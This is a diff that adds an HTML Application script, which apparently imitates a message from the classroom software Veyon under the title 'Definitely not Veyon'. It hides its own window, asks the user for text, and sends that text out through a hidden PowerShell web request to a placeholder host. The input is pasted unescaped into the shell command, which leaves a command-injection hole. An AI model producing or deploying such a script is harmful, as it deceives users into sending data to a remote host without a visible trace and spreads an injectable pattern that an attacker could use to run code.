@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <HTA:APPLICATION
+        ICON="#"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="no"
+        CAPTION="no"
+        SHOWINTASKBAR="no"/>
+   <script type="text/vbscript" LANGUAGE="VBScript">
+        Function VBInputBox(promptText, promtTitle)
+            VBInputBox = InputBox(promptText, promtTitle)
+        End Function
+   </script>
+    <script type="text/javascript" language="JScript">
+        window.resizeTo(0, 0)
+        if (!window['ActiveXObject']) {
+            document.write('Dont open it in the browser!!!')
+        } else {
+            var o = new ActiveXObject("Wscript.Shell")
+            o.Popup("MESSAGE", 0, "Definitely not Veyon")
+            var res = VBInputBox("Response text:", "Definitely not Veyon")
+            if (res) {
+                var cmd = "powershell Invoke-WebRequest -Uri 'http://HOST/message' -Method POST -Body '" + res + "'"
+                o.Run(cmd, 0)
+            }
+            window.close()
+        }
+    </script>
+</head>
+
+</html>
